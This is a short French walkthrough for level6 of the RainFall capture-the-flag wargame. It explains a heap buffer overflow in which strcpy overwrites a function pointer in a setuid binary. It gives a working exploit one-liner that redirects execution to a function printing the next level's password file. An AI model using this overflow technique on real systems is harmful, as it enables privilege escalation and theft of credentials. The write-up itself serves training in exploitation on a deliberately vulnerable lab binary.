# Level6 — Walkthrough

## 1. Objectif

Obtenir le mot de passe level7. Le binaire est setuid level7 ; la fonction **n()** exécute **system("/bin/cat /home/user/level7/.pass")** mais n’est pas appelée par défaut.

## 2. Inspection

- **main** : alloue un buffer (64 octets), un bloc de 4 octets (pointeur de fonction), initialise ce pointeur avec l’adresse de **m**, fait **strcpy(buffer, argv[1])**, puis **call *pointeur**.
- **m** : affiche "Nope".
- **n** : exécute `/bin/cat /home/user/level7/.pass`.

## 3. Vulnérabilité

- **Buffer overflow** : **strcpy** copie argv[1] sans limite dans un buffer de 64 octets. Le bloc suivant (malloc(4)) contient le pointeur de fonction. En dépassant 64 octets, on écrase ce pointeur.

## 4. Exploit

- Remplacer le pointeur par l’adresse de **n** (0x08048454). Sur RainFall : **72 octets** + **\x54\x84\x04\x08**.
- Commande : `./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`.

## 5. Récupération du mot de passe

En cas de succès, le programme affiche le mot de passe level7. Consigner dans `level6/flag`.
